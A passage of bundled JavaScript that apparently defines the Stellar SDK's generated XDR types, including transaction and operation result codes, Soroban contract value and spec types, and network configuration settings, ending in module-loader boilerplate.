                restoreFootprintResourceLimitExceeded: -2,
                restoreFootprintInsufficientRefundableFee: -3
            }),
            b.union("RestoreFootprintResult", {
                switchOn: b.lookup("RestoreFootprintResultCode"),
                switchName: "code",
                switches: [["restoreFootprintSuccess", b.void()], ["restoreFootprintMalformed", b.void()], ["restoreFootprintResourceLimitExceeded", b.void()], ["restoreFootprintInsufficientRefundableFee", b.void()]],
                arms: {}
            }),
            b.enum("OperationResultCode", {
                opInner: 0,
                opBadAuth: -1,
                opNoAccount: -2,
                opNotSupported: -3,
                opTooManySubentries: -4,
                opExceededWorkLimit: -5,
                opTooManySponsoring: -6
            }),
            b.union("OperationResultTr", {
                switchOn: b.lookup("OperationType"),
                switchName: "type",
                switches: [["createAccount", "createAccountResult"], ["payment", "paymentResult"], ["pathPaymentStrictReceive", "pathPaymentStrictReceiveResult"], ["manageSellOffer", "manageSellOfferResult"], ["createPassiveSellOffer", "createPassiveSellOfferResult"], ["setOptions", "setOptionsResult"], ["changeTrust", "changeTrustResult"], ["allowTrust", "allowTrustResult"], ["accountMerge", "accountMergeResult"], ["inflation", "inflationResult"], ["manageData", "manageDataResult"], ["bumpSequence", "bumpSeqResult"], ["manageBuyOffer", "manageBuyOfferResult"], ["pathPaymentStrictSend", "pathPaymentStrictSendResult"], ["createClaimableBalance", "createClaimableBalanceResult"], ["claimClaimableBalance", "claimClaimableBalanceResult"], ["beginSponsoringFutureReserves", "beginSponsoringFutureReservesResult"], ["endSponsoringFutureReserves", "endSponsoringFutureReservesResult"], ["revokeSponsorship", "revokeSponsorshipResult"], ["clawback", "clawbackResult"], ["clawbackClaimableBalance", "clawbackClaimableBalanceResult"], ["setTrustLineFlags", "setTrustLineFlagsResult"], ["liquidityPoolDeposit", "liquidityPoolDepositResult"], ["liquidityPoolWithdraw", "liquidityPoolWithdrawResult"], ["invokeHostFunction", "invokeHostFunctionResult"], ["extendFootprintTtl", "extendFootprintTtlResult"], ["restoreFootprint", "restoreFootprintResult"]],
                arms: {
                    createAccountResult: b.lookup("CreateAccountResult"),
                    paymentResult: b.lookup("PaymentResult"),
                    pathPaymentStrictReceiveResult: b.lookup("PathPaymentStrictReceiveResult"),
                    manageSellOfferResult: b.lookup("ManageSellOfferResult"),
                    createPassiveSellOfferResult: b.lookup("ManageSellOfferResult"),
                    setOptionsResult: b.lookup("SetOptionsResult"),
                    changeTrustResult: b.lookup("ChangeTrustResult"),
                    allowTrustResult: b.lookup("AllowTrustResult"),
                    accountMergeResult: b.lookup("AccountMergeResult"),
                    inflationResult: b.lookup("InflationResult"),
                    manageDataResult: b.lookup("ManageDataResult"),
                    bumpSeqResult: b.lookup("BumpSequenceResult"),
                    manageBuyOfferResult: b.lookup("ManageBuyOfferResult"),
                    pathPaymentStrictSendResult: b.lookup("PathPaymentStrictSendResult"),
                    createClaimableBalanceResult: b.lookup("CreateClaimableBalanceResult"),
                    claimClaimableBalanceResult: b.lookup("ClaimClaimableBalanceResult"),
                    beginSponsoringFutureReservesResult: b.lookup("BeginSponsoringFutureReservesResult"),
                    endSponsoringFutureReservesResult: b.lookup("EndSponsoringFutureReservesResult"),
                    revokeSponsorshipResult: b.lookup("RevokeSponsorshipResult"),
                    clawbackResult: b.lookup("ClawbackResult"),
                    clawbackClaimableBalanceResult: b.lookup("ClawbackClaimableBalanceResult"),
                    setTrustLineFlagsResult: b.lookup("SetTrustLineFlagsResult"),
                    liquidityPoolDepositResult: b.lookup("LiquidityPoolDepositResult"),
                    liquidityPoolWithdrawResult: b.lookup("LiquidityPoolWithdrawResult"),
                    invokeHostFunctionResult: b.lookup("InvokeHostFunctionResult"),
                    extendFootprintTtlResult: b.lookup("ExtendFootprintTtlResult"),
                    restoreFootprintResult: b.lookup("RestoreFootprintResult")
                }
            }),
            b.union("OperationResult", {
                switchOn: b.lookup("OperationResultCode"),
                switchName: "code",
                switches: [["opInner", "tr"], ["opBadAuth", b.void()], ["opNoAccount", b.void()], ["opNotSupported", b.void()], ["opTooManySubentries", b.void()], ["opExceededWorkLimit", b.void()], ["opTooManySponsoring", b.void()]],
                arms: {
                    tr: b.lookup("OperationResultTr")
                }
            }),
            b.enum("TransactionResultCode", {
                txFeeBumpInnerSuccess: 1,
                txSuccess: 0,
                txFailed: -1,
                txTooEarly: -2,
                txTooLate: -3,
                txMissingOperation: -4,
                txBadSeq: -5,
                txBadAuth: -6,
                txInsufficientBalance: -7,
                txNoAccount: -8,
                txInsufficientFee: -9,
                txBadAuthExtra: -10,
                txInternalError: -11,
                txNotSupported: -12,
                txFeeBumpInnerFailed: -13,
                txBadSponsorship: -14,
                txBadMinSeqAgeOrGap: -15,
                txMalformed: -16,
                txSorobanInvalid: -17
            }),
            b.union("InnerTransactionResultResult", {
                switchOn: b.lookup("TransactionResultCode"),
                switchName: "code",
                switches: [["txSuccess", "results"], ["txFailed", "results"], ["txTooEarly", b.void()], ["txTooLate", b.void()], ["txMissingOperation", b.void()], ["txBadSeq", b.void()], ["txBadAuth", b.void()], ["txInsufficientBalance", b.void()], ["txNoAccount", b.void()], ["txInsufficientFee", b.void()], ["txBadAuthExtra", b.void()], ["txInternalError", b.void()], ["txNotSupported", b.void()], ["txBadSponsorship", b.void()], ["txBadMinSeqAgeOrGap", b.void()], ["txMalformed", b.void()], ["txSorobanInvalid", b.void()]],
                arms: {
                    results: b.varArray(b.lookup("OperationResult"), 2147483647)
                }
            }),
            b.union("InnerTransactionResultExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("InnerTransactionResult", [["feeCharged", b.lookup("Int64")], ["result", b.lookup("InnerTransactionResultResult")], ["ext", b.lookup("InnerTransactionResultExt")]]),
            b.struct("InnerTransactionResultPair", [["transactionHash", b.lookup("Hash")], ["result", b.lookup("InnerTransactionResult")]]),
            b.union("TransactionResultResult", {
                switchOn: b.lookup("TransactionResultCode"),
                switchName: "code",
                switches: [["txFeeBumpInnerSuccess", "innerResultPair"], ["txFeeBumpInnerFailed", "innerResultPair"], ["txSuccess", "results"], ["txFailed", "results"], ["txTooEarly", b.void()], ["txTooLate", b.void()], ["txMissingOperation", b.void()], ["txBadSeq", b.void()], ["txBadAuth", b.void()], ["txInsufficientBalance", b.void()], ["txNoAccount", b.void()], ["txInsufficientFee", b.void()], ["txBadAuthExtra", b.void()], ["txInternalError", b.void()], ["txNotSupported", b.void()], ["txBadSponsorship", b.void()], ["txBadMinSeqAgeOrGap", b.void()], ["txMalformed", b.void()], ["txSorobanInvalid", b.void()]],
                arms: {
                    innerResultPair: b.lookup("InnerTransactionResultPair"),
                    results: b.varArray(b.lookup("OperationResult"), 2147483647)
                }
            }),
            b.union("TransactionResultExt", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.struct("TransactionResult", [["feeCharged", b.lookup("Int64")], ["result", b.lookup("TransactionResultResult")], ["ext", b.lookup("TransactionResultExt")]]),
            b.typedef("Hash", b.opaque(32)),
            b.typedef("Uint256", b.opaque(32)),
            b.typedef("Uint32", b.uint()),
            b.typedef("Int32", b.int()),
            b.typedef("Uint64", b.uhyper()),
            b.typedef("Int64", b.hyper()),
            b.typedef("TimePoint", b.lookup("Uint64")),
            b.typedef("Duration", b.lookup("Uint64")),
            b.union("ExtensionPoint", {
                switchOn: b.int(),
                switchName: "v",
                switches: [[0, b.void()]],
                arms: {}
            }),
            b.enum("CryptoKeyType", {
                keyTypeEd25519: 0,
                keyTypePreAuthTx: 1,
                keyTypeHashX: 2,
                keyTypeEd25519SignedPayload: 3,
                keyTypeMuxedEd25519: 256
            }),
            b.enum("PublicKeyType", {
                publicKeyTypeEd25519: 0
            }),
            b.enum("SignerKeyType", {
                signerKeyTypeEd25519: 0,
                signerKeyTypePreAuthTx: 1,
                signerKeyTypeHashX: 2,
                signerKeyTypeEd25519SignedPayload: 3
            }),
            b.union("PublicKey", {
                switchOn: b.lookup("PublicKeyType"),
                switchName: "type",
                switches: [["publicKeyTypeEd25519", "ed25519"]],
                arms: {
                    ed25519: b.lookup("Uint256")
                }
            }),
            b.struct("SignerKeyEd25519SignedPayload", [["ed25519", b.lookup("Uint256")], ["payload", b.varOpaque(64)]]),
            b.union("SignerKey", {
                switchOn: b.lookup("SignerKeyType"),
                switchName: "type",
                switches: [["signerKeyTypeEd25519", "ed25519"], ["signerKeyTypePreAuthTx", "preAuthTx"], ["signerKeyTypeHashX", "hashX"], ["signerKeyTypeEd25519SignedPayload", "ed25519SignedPayload"]],
                arms: {
                    ed25519: b.lookup("Uint256"),
                    preAuthTx: b.lookup("Uint256"),
                    hashX: b.lookup("Uint256"),
                    ed25519SignedPayload: b.lookup("SignerKeyEd25519SignedPayload")
                }
            }),
            b.typedef("Signature", b.varOpaque(64)),
            b.typedef("SignatureHint", b.opaque(4)),
            b.typedef("NodeId", b.lookup("PublicKey")),
            b.typedef("AccountId", b.lookup("PublicKey")),
            b.struct("Curve25519Secret", [["key", b.opaque(32)]]),
            b.struct("Curve25519Public", [["key", b.opaque(32)]]),
            b.struct("HmacSha256Key", [["key", b.opaque(32)]]),
            b.struct("HmacSha256Mac", [["mac", b.opaque(32)]]),
            b.struct("ShortHashSeed", [["seed", b.opaque(16)]]),
            b.enum("BinaryFuseFilterType", {
                binaryFuseFilter8Bit: 0,
                binaryFuseFilter16Bit: 1,
                binaryFuseFilter32Bit: 2
            }),
            b.struct("SerializedBinaryFuseFilter", [["type", b.lookup("BinaryFuseFilterType")], ["inputHashSeed", b.lookup("ShortHashSeed")], ["filterSeed", b.lookup("ShortHashSeed")], ["segmentLength", b.lookup("Uint32")], ["segementLengthMask", b.lookup("Uint32")], ["segmentCount", b.lookup("Uint32")], ["segmentCountLength", b.lookup("Uint32")], ["fingerprintLength", b.lookup("Uint32")], ["fingerprints", b.varOpaque()]]),
            b.enum("ScValType", {
                scvBool: 0,
                scvVoid: 1,
                scvError: 2,
                scvU32: 3,
                scvI32: 4,
                scvU64: 5,
                scvI64: 6,
                scvTimepoint: 7,
                scvDuration: 8,
                scvU128: 9,
                scvI128: 10,
                scvU256: 11,
                scvI256: 12,
                scvBytes: 13,
                scvString: 14,
                scvSymbol: 15,
                scvVec: 16,
                scvMap: 17,
                scvAddress: 18,
                scvContractInstance: 19,
                scvLedgerKeyContractInstance: 20,
                scvLedgerKeyNonce: 21
            }),
            b.enum("ScErrorType", {
                sceContract: 0,
                sceWasmVm: 1,
                sceContext: 2,
                sceStorage: 3,
                sceObject: 4,
                sceCrypto: 5,
                sceEvents: 6,
                sceBudget: 7,
                sceValue: 8,
                sceAuth: 9
            }),
            b.enum("ScErrorCode", {
                scecArithDomain: 0,
                scecIndexBounds: 1,
                scecInvalidInput: 2,
                scecMissingValue: 3,
                scecExistingValue: 4,
                scecExceededLimit: 5,
                scecInvalidAction: 6,
                scecInternalError: 7,
                scecUnexpectedType: 8,
                scecUnexpectedSize: 9
            }),
            b.union("ScError", {
                switchOn: b.lookup("ScErrorType"),
                switchName: "type",
                switches: [["sceContract", "contractCode"], ["sceWasmVm", "code"], ["sceContext", "code"], ["sceStorage", "code"], ["sceObject", "code"], ["sceCrypto", "code"], ["sceEvents", "code"], ["sceBudget", "code"], ["sceValue", "code"], ["sceAuth", "code"]],
                arms: {
                    contractCode: b.lookup("Uint32"),
                    code: b.lookup("ScErrorCode")
                }
            }),
            b.struct("UInt128Parts", [["hi", b.lookup("Uint64")], ["lo", b.lookup("Uint64")]]),
            b.struct("Int128Parts", [["hi", b.lookup("Int64")], ["lo", b.lookup("Uint64")]]),
            b.struct("UInt256Parts", [["hiHi", b.lookup("Uint64")], ["hiLo", b.lookup("Uint64")], ["loHi", b.lookup("Uint64")], ["loLo", b.lookup("Uint64")]]),
            b.struct("Int256Parts", [["hiHi", b.lookup("Int64")], ["hiLo", b.lookup("Uint64")], ["loHi", b.lookup("Uint64")], ["loLo", b.lookup("Uint64")]]),
            b.enum("ContractExecutableType", {
                contractExecutableWasm: 0,
                contractExecutableStellarAsset: 1
            }),
            b.union("ContractExecutable", {
                switchOn: b.lookup("ContractExecutableType"),
                switchName: "type",
                switches: [["contractExecutableWasm", "wasmHash"], ["contractExecutableStellarAsset", b.void()]],
                arms: {
                    wasmHash: b.lookup("Hash")
                }
            }),
            b.enum("ScAddressType", {
                scAddressTypeAccount: 0,
                scAddressTypeContract: 1
            }),
            b.union("ScAddress", {
                switchOn: b.lookup("ScAddressType"),
                switchName: "type",
                switches: [["scAddressTypeAccount", "accountId"], ["scAddressTypeContract", "contractId"]],
                arms: {
                    accountId: b.lookup("AccountId"),
                    contractId: b.lookup("Hash")
                }
            }),
            b.const("SCSYMBOL_LIMIT", 32),
            b.typedef("ScVec", b.varArray(b.lookup("ScVal"), 2147483647)),
            b.typedef("ScMap", b.varArray(b.lookup("ScMapEntry"), 2147483647)),
            b.typedef("ScBytes", b.varOpaque()),
            b.typedef("ScString", b.string()),
            b.typedef("ScSymbol", b.string(X)),
            b.struct("ScNonceKey", [["nonce", b.lookup("Int64")]]),
            b.struct("ScContractInstance", [["executable", b.lookup("ContractExecutable")], ["storage", b.option(b.lookup("ScMap"))]]),
            b.union("ScVal", {
                switchOn: b.lookup("ScValType"),
                switchName: "type",
                switches: [["scvBool", "b"], ["scvVoid", b.void()], ["scvError", "error"], ["scvU32", "u32"], ["scvI32", "i32"], ["scvU64", "u64"], ["scvI64", "i64"], ["scvTimepoint", "timepoint"], ["scvDuration", "duration"], ["scvU128", "u128"], ["scvI128", "i128"], ["scvU256", "u256"], ["scvI256", "i256"], ["scvBytes", "bytes"], ["scvString", "str"], ["scvSymbol", "sym"], ["scvVec", "vec"], ["scvMap", "map"], ["scvAddress", "address"], ["scvLedgerKeyContractInstance", b.void()], ["scvLedgerKeyNonce", "nonceKey"], ["scvContractInstance", "instance"]],
                arms: {
                    b: b.bool(),
                    error: b.lookup("ScError"),
                    u32: b.lookup("Uint32"),
                    i32: b.lookup("Int32"),
                    u64: b.lookup("Uint64"),
                    i64: b.lookup("Int64"),
                    timepoint: b.lookup("TimePoint"),
                    duration: b.lookup("Duration"),
                    u128: b.lookup("UInt128Parts"),
                    i128: b.lookup("Int128Parts"),
                    u256: b.lookup("UInt256Parts"),
                    i256: b.lookup("Int256Parts"),
                    bytes: b.lookup("ScBytes"),
                    str: b.lookup("ScString"),
                    sym: b.lookup("ScSymbol"),
                    vec: b.option(b.lookup("ScVec")),
                    map: b.option(b.lookup("ScMap")),
                    address: b.lookup("ScAddress"),
                    nonceKey: b.lookup("ScNonceKey"),
                    instance: b.lookup("ScContractInstance")
                }
            }),
            b.struct("ScMapEntry", [["key", b.lookup("ScVal")], ["val", b.lookup("ScVal")]]),
            b.enum("ScEnvMetaKind", {
                scEnvMetaKindInterfaceVersion: 0
            }),
            b.struct("ScEnvMetaEntryInterfaceVersion", [["protocol", b.lookup("Uint32")], ["preRelease", b.lookup("Uint32")]]),
            b.union("ScEnvMetaEntry", {
                switchOn: b.lookup("ScEnvMetaKind"),
                switchName: "kind",
                switches: [["scEnvMetaKindInterfaceVersion", "interfaceVersion"]],
                arms: {
                    interfaceVersion: b.lookup("ScEnvMetaEntryInterfaceVersion")
                }
            }),
            b.struct("ScMetaV0", [["key", b.string()], ["val", b.string()]]),
            b.enum("ScMetaKind", {
                scMetaV0: 0
            }),
            b.union("ScMetaEntry", {
                switchOn: b.lookup("ScMetaKind"),
                switchName: "kind",
                switches: [["scMetaV0", "v0"]],
                arms: {
                    v0: b.lookup("ScMetaV0")
                }
            }),
            b.const("SC_SPEC_DOC_LIMIT", 1024),
            b.enum("ScSpecType", {
                scSpecTypeVal: 0,
                scSpecTypeBool: 1,
                scSpecTypeVoid: 2,
                scSpecTypeError: 3,
                scSpecTypeU32: 4,
                scSpecTypeI32: 5,
                scSpecTypeU64: 6,
                scSpecTypeI64: 7,
                scSpecTypeTimepoint: 8,
                scSpecTypeDuration: 9,
                scSpecTypeU128: 10,
                scSpecTypeI128: 11,
                scSpecTypeU256: 12,
                scSpecTypeI256: 13,
                scSpecTypeBytes: 14,
                scSpecTypeString: 16,
                scSpecTypeSymbol: 17,
                scSpecTypeAddress: 19,
                scSpecTypeOption: 1e3,
                scSpecTypeResult: 1001,
                scSpecTypeVec: 1002,
                scSpecTypeMap: 1004,
                scSpecTypeTuple: 1005,
                scSpecTypeBytesN: 1006,
                scSpecTypeUdt: 2e3
            }),
            b.struct("ScSpecTypeOption", [["valueType", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecTypeResult", [["okType", b.lookup("ScSpecTypeDef")], ["errorType", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecTypeVec", [["elementType", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecTypeMap", [["keyType", b.lookup("ScSpecTypeDef")], ["valueType", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecTypeTuple", [["valueTypes", b.varArray(b.lookup("ScSpecTypeDef"), 12)]]),
            b.struct("ScSpecTypeBytesN", [["n", b.lookup("Uint32")]]),
            b.struct("ScSpecTypeUdt", [["name", b.string(60)]]),
            b.union("ScSpecTypeDef", {
                switchOn: b.lookup("ScSpecType"),
                switchName: "type",
                switches: [["scSpecTypeVal", b.void()], ["scSpecTypeBool", b.void()], ["scSpecTypeVoid", b.void()], ["scSpecTypeError", b.void()], ["scSpecTypeU32", b.void()], ["scSpecTypeI32", b.void()], ["scSpecTypeU64", b.void()], ["scSpecTypeI64", b.void()], ["scSpecTypeTimepoint", b.void()], ["scSpecTypeDuration", b.void()], ["scSpecTypeU128", b.void()], ["scSpecTypeI128", b.void()], ["scSpecTypeU256", b.void()], ["scSpecTypeI256", b.void()], ["scSpecTypeBytes", b.void()], ["scSpecTypeString", b.void()], ["scSpecTypeSymbol", b.void()], ["scSpecTypeAddress", b.void()], ["scSpecTypeOption", "option"], ["scSpecTypeResult", "result"], ["scSpecTypeVec", "vec"], ["scSpecTypeMap", "map"], ["scSpecTypeTuple", "tuple"], ["scSpecTypeBytesN", "bytesN"], ["scSpecTypeUdt", "udt"]],
                arms: {
                    option: b.lookup("ScSpecTypeOption"),
                    result: b.lookup("ScSpecTypeResult"),
                    vec: b.lookup("ScSpecTypeVec"),
                    map: b.lookup("ScSpecTypeMap"),
                    tuple: b.lookup("ScSpecTypeTuple"),
                    bytesN: b.lookup("ScSpecTypeBytesN"),
                    udt: b.lookup("ScSpecTypeUdt")
                }
            }),
            b.struct("ScSpecUdtStructFieldV0", [["doc", b.string(Y)], ["name", b.string(30)], ["type", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecUdtStructV0", [["doc", b.string(Y)], ["lib", b.string(80)], ["name", b.string(60)], ["fields", b.varArray(b.lookup("ScSpecUdtStructFieldV0"), 40)]]),
            b.struct("ScSpecUdtUnionCaseVoidV0", [["doc", b.string(Y)], ["name", b.string(60)]]),
            b.struct("ScSpecUdtUnionCaseTupleV0", [["doc", b.string(Y)], ["name", b.string(60)], ["type", b.varArray(b.lookup("ScSpecTypeDef"), 12)]]),
            b.enum("ScSpecUdtUnionCaseV0Kind", {
                scSpecUdtUnionCaseVoidV0: 0,
                scSpecUdtUnionCaseTupleV0: 1
            }),
            b.union("ScSpecUdtUnionCaseV0", {
                switchOn: b.lookup("ScSpecUdtUnionCaseV0Kind"),
                switchName: "kind",
                switches: [["scSpecUdtUnionCaseVoidV0", "voidCase"], ["scSpecUdtUnionCaseTupleV0", "tupleCase"]],
                arms: {
                    voidCase: b.lookup("ScSpecUdtUnionCaseVoidV0"),
                    tupleCase: b.lookup("ScSpecUdtUnionCaseTupleV0")
                }
            }),
            b.struct("ScSpecUdtUnionV0", [["doc", b.string(Y)], ["lib", b.string(80)], ["name", b.string(60)], ["cases", b.varArray(b.lookup("ScSpecUdtUnionCaseV0"), 50)]]),
            b.struct("ScSpecUdtEnumCaseV0", [["doc", b.string(Y)], ["name", b.string(60)], ["value", b.lookup("Uint32")]]),
            b.struct("ScSpecUdtEnumV0", [["doc", b.string(Y)], ["lib", b.string(80)], ["name", b.string(60)], ["cases", b.varArray(b.lookup("ScSpecUdtEnumCaseV0"), 50)]]),
            b.struct("ScSpecUdtErrorEnumCaseV0", [["doc", b.string(Y)], ["name", b.string(60)], ["value", b.lookup("Uint32")]]),
            b.struct("ScSpecUdtErrorEnumV0", [["doc", b.string(Y)], ["lib", b.string(80)], ["name", b.string(60)], ["cases", b.varArray(b.lookup("ScSpecUdtErrorEnumCaseV0"), 50)]]),
            b.struct("ScSpecFunctionInputV0", [["doc", b.string(Y)], ["name", b.string(30)], ["type", b.lookup("ScSpecTypeDef")]]),
            b.struct("ScSpecFunctionV0", [["doc", b.string(Y)], ["name", b.lookup("ScSymbol")], ["inputs", b.varArray(b.lookup("ScSpecFunctionInputV0"), 10)], ["outputs", b.varArray(b.lookup("ScSpecTypeDef"), 1)]]),
            b.enum("ScSpecEntryKind", {
                scSpecEntryFunctionV0: 0,
                scSpecEntryUdtStructV0: 1,
                scSpecEntryUdtUnionV0: 2,
                scSpecEntryUdtEnumV0: 3,
                scSpecEntryUdtErrorEnumV0: 4
            }),
            b.union("ScSpecEntry", {
                switchOn: b.lookup("ScSpecEntryKind"),
                switchName: "kind",
                switches: [["scSpecEntryFunctionV0", "functionV0"], ["scSpecEntryUdtStructV0", "udtStructV0"], ["scSpecEntryUdtUnionV0", "udtUnionV0"], ["scSpecEntryUdtEnumV0", "udtEnumV0"], ["scSpecEntryUdtErrorEnumV0", "udtErrorEnumV0"]],
                arms: {
                    functionV0: b.lookup("ScSpecFunctionV0"),
                    udtStructV0: b.lookup("ScSpecUdtStructV0"),
                    udtUnionV0: b.lookup("ScSpecUdtUnionV0"),
                    udtEnumV0: b.lookup("ScSpecUdtEnumV0"),
                    udtErrorEnumV0: b.lookup("ScSpecUdtErrorEnumV0")
                }
            }),
            b.struct("ConfigSettingContractExecutionLanesV0", [["ledgerMaxTxCount", b.lookup("Uint32")]]),
            b.struct("ConfigSettingContractComputeV0", [["ledgerMaxInstructions", b.lookup("Int64")], ["txMaxInstructions", b.lookup("Int64")], ["feeRatePerInstructionsIncrement", b.lookup("Int64")], ["txMemoryLimit", b.lookup("Uint32")]]),
            b.struct("ConfigSettingContractLedgerCostV0", [["ledgerMaxReadLedgerEntries", b.lookup("Uint32")], ["ledgerMaxReadBytes", b.lookup("Uint32")], ["ledgerMaxWriteLedgerEntries", b.lookup("Uint32")], ["ledgerMaxWriteBytes", b.lookup("Uint32")], ["txMaxReadLedgerEntries", b.lookup("Uint32")], ["txMaxReadBytes", b.lookup("Uint32")], ["txMaxWriteLedgerEntries", b.lookup("Uint32")], ["txMaxWriteBytes", b.lookup("Uint32")], ["feeReadLedgerEntry", b.lookup("Int64")], ["feeWriteLedgerEntry", b.lookup("Int64")], ["feeRead1Kb", b.lookup("Int64")], ["bucketListTargetSizeBytes", b.lookup("Int64")], ["writeFee1KbBucketListLow", b.lookup("Int64")], ["writeFee1KbBucketListHigh", b.lookup("Int64")], ["bucketListWriteFeeGrowthFactor", b.lookup("Uint32")]]),
            b.struct("ConfigSettingContractHistoricalDataV0", [["feeHistorical1Kb", b.lookup("Int64")]]),
            b.struct("ConfigSettingContractEventsV0", [["txMaxContractEventsSizeBytes", b.lookup("Uint32")], ["feeContractEvents1Kb", b.lookup("Int64")]]),
            b.struct("ConfigSettingContractBandwidthV0", [["ledgerMaxTxsSizeBytes", b.lookup("Uint32")], ["txMaxSizeBytes", b.lookup("Uint32")], ["feeTxSize1Kb", b.lookup("Int64")]]),
            b.enum("ContractCostType", {
                wasmInsnExec: 0,
                memAlloc: 1,
                memCpy: 2,
                memCmp: 3,
                dispatchHostFunction: 4,
                visitObject: 5,
                valSer: 6,
                valDeser: 7,
                computeSha256Hash: 8,
                computeEd25519PubKey: 9,
                verifyEd25519Sig: 10,
                vmInstantiation: 11,
                vmCachedInstantiation: 12,
                invokeVmFunction: 13,
                computeKeccak256Hash: 14,
                decodeEcdsaCurve256Sig: 15,
                recoverEcdsaSecp256k1Key: 16,
                int256AddSub: 17,
                int256Mul: 18,
                int256Div: 19,
                int256Pow: 20,
                int256Shift: 21,
                chaCha20DrawBytes: 22,
                parseWasmInstructions: 23,
                parseWasmFunctions: 24,
                parseWasmGlobals: 25,
                parseWasmTableEntries: 26,
                parseWasmTypes: 27,
                parseWasmDataSegments: 28,
                parseWasmElemSegments: 29,
                parseWasmImports: 30,
                parseWasmExports: 31,
                parseWasmDataSegmentBytes: 32,
                instantiateWasmInstructions: 33,
                instantiateWasmFunctions: 34,
                instantiateWasmGlobals: 35,
                instantiateWasmTableEntries: 36,
                instantiateWasmTypes: 37,
                instantiateWasmDataSegments: 38,
                instantiateWasmElemSegments: 39,
                instantiateWasmImports: 40,
                instantiateWasmExports: 41,
                instantiateWasmDataSegmentBytes: 42,
                sec1DecodePointUncompressed: 43,
                verifyEcdsaSecp256r1Sig: 44,
                bls12381EncodeFp: 45,
                bls12381DecodeFp: 46,
                bls12381G1CheckPointOnCurve: 47,
                bls12381G1CheckPointInSubgroup: 48,
                bls12381G2CheckPointOnCurve: 49,
                bls12381G2CheckPointInSubgroup: 50,
                bls12381G1ProjectiveToAffine: 51,
                bls12381G2ProjectiveToAffine: 52,
                bls12381G1Add: 53,
                bls12381G1Mul: 54,
                bls12381G1Msm: 55,
                bls12381MapFpToG1: 56,
                bls12381HashToG1: 57,
                bls12381G2Add: 58,
                bls12381G2Mul: 59,
                bls12381G2Msm: 60,
                bls12381MapFp2ToG2: 61,
                bls12381HashToG2: 62,
                bls12381Pairing: 63,
                bls12381FrFromU256: 64,
                bls12381FrToU256: 65,
                bls12381FrAddSub: 66,
                bls12381FrMul: 67,
                bls12381FrPow: 68,
                bls12381FrInv: 69
            }),
            b.struct("ContractCostParamEntry", [["ext", b.lookup("ExtensionPoint")], ["constTerm", b.lookup("Int64")], ["linearTerm", b.lookup("Int64")]]),
            b.struct("StateArchivalSettings", [["maxEntryTtl", b.lookup("Uint32")], ["minTemporaryTtl", b.lookup("Uint32")], ["minPersistentTtl", b.lookup("Uint32")], ["persistentRentRateDenominator", b.lookup("Int64")], ["tempRentRateDenominator", b.lookup("Int64")], ["maxEntriesToArchive", b.lookup("Uint32")], ["bucketListSizeWindowSampleSize", b.lookup("Uint32")], ["bucketListWindowSamplePeriod", b.lookup("Uint32")], ["evictionScanSize", b.lookup("Uint32")], ["startingEvictionScanLevel", b.lookup("Uint32")]]),
            b.struct("EvictionIterator", [["bucketListLevel", b.lookup("Uint32")], ["isCurrBucket", b.bool()], ["bucketFileOffset", b.lookup("Uint64")]]),
            b.const("CONTRACT_COST_COUNT_LIMIT", 1024),
            b.typedef("ContractCostParams", b.varArray(b.lookup("ContractCostParamEntry"), b.lookup("CONTRACT_COST_COUNT_LIMIT"))),
            b.enum("ConfigSettingId", {
                configSettingContractMaxSizeBytes: 0,
                configSettingContractComputeV0: 1,
                configSettingContractLedgerCostV0: 2,
                configSettingContractHistoricalDataV0: 3,
                configSettingContractEventsV0: 4,
                configSettingContractBandwidthV0: 5,
                configSettingContractCostParamsCpuInstructions: 6,
                configSettingContractCostParamsMemoryBytes: 7,
                configSettingContractDataKeySizeBytes: 8,
                configSettingContractDataEntrySizeBytes: 9,
                configSettingStateArchival: 10,
                configSettingContractExecutionLanes: 11,
                configSettingBucketlistSizeWindow: 12,
                configSettingEvictionIterator: 13
            }),
            b.union("ConfigSettingEntry", {
                switchOn: b.lookup("ConfigSettingId"),
                switchName: "configSettingId",
                switches: [["configSettingContractMaxSizeBytes", "contractMaxSizeBytes"], ["configSettingContractComputeV0", "contractCompute"], ["configSettingContractLedgerCostV0", "contractLedgerCost"], ["configSettingContractHistoricalDataV0", "contractHistoricalData"], ["configSettingContractEventsV0", "contractEvents"], ["configSettingContractBandwidthV0", "contractBandwidth"], ["configSettingContractCostParamsCpuInstructions", "contractCostParamsCpuInsns"], ["configSettingContractCostParamsMemoryBytes", "contractCostParamsMemBytes"], ["configSettingContractDataKeySizeBytes", "contractDataKeySizeBytes"], ["configSettingContractDataEntrySizeBytes", "contractDataEntrySizeBytes"], ["configSettingStateArchival", "stateArchivalSettings"], ["configSettingContractExecutionLanes", "contractExecutionLanes"], ["configSettingBucketlistSizeWindow", "bucketListSizeWindow"], ["configSettingEvictionIterator", "evictionIterator"]],
                arms: {
                    contractMaxSizeBytes: b.lookup("Uint32"),
                    contractCompute: b.lookup("ConfigSettingContractComputeV0"),
                    contractLedgerCost: b.lookup("ConfigSettingContractLedgerCostV0"),
                    contractHistoricalData: b.lookup("ConfigSettingContractHistoricalDataV0"),
                    contractEvents: b.lookup("ConfigSettingContractEventsV0"),
                    contractBandwidth: b.lookup("ConfigSettingContractBandwidthV0"),
                    contractCostParamsCpuInsns: b.lookup("ContractCostParams"),
                    contractCostParamsMemBytes: b.lookup("ContractCostParams"),
                    contractDataKeySizeBytes: b.lookup("Uint32"),
                    contractDataEntrySizeBytes: b.lookup("Uint32"),
                    stateArchivalSettings: b.lookup("StateArchivalSettings"),
                    contractExecutionLanes: b.lookup("ConfigSettingContractExecutionLanesV0"),
                    bucketListSizeWindow: b.varArray(b.lookup("Uint64"), 2147483647),
                    evictionIterator: b.lookup("EvictionIterator")
                }
            })
        });
        _.default = w
    }(curr_generated)),
    curr_generated
}
var hasRequiredXdr;
function requireXdr() {
    return hasRequiredXdr || (hasRequiredXdr = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.default = void 0;
        var M = j(requireCurr_generated());
        function j(O) {
            return O && O.__esModule ? O : {
                default: O
            }
        }
        _.default = M.default
    }(xdr$2)),
    xdr$2
}
var jsxdr = {}, hasRequiredJsxdr;
function requireJsxdr() {
